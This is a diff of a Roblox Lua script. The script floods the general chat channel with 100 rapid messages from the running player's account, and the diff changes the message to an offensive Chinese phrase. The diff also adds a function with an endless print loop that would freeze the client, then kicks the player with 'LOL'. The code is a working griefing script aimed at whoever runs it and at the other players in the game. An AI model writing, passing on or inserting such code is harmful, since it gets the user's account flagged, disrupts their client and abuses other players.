@@ -2,6 +2,14 @@ local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
 local player = Players.LocalPlayer
 
+local function Caton()
+    coroutine.wrap(function()
+        while true do
+            print("Fuck You")
+        end
+    end)()
+end
+
 local function spamExpose()
     local textChannelContainer = TextChatService:FindFirstChild("TextChannels")
     if textChannelContainer then
@@ -10,19 +18,20 @@ local function spamExpose()
             for i = 1, 100 do
                 task.spawn(function()
                     pcall(function()
-                        general:SendAsync("FUCK OFF")
+                        general:SendAsync("我要吃小孩")
                     end)
                 end)
                 task.wait(0.01)
             end
         else
-            warn("聊天频道RBXGeneral未找到. Chat channel RBXGeneral not found.")
+            warn("聊天频道RBXGeneral未找到.")
         end
     else
-        warn("TextChannels未加载. TextChannels not loaded.")
+        warn("TextChannels未加载.")
     end
 end
    
-spamExpose()    
-task.wait(2) 
-player:Kick("\n你的账号马上就要爆炸了！\nYour account is about to be banned! \nLOL")
+spamExpose()
+Caton()
+task.wait(5) 
+player:Kick("LOL")
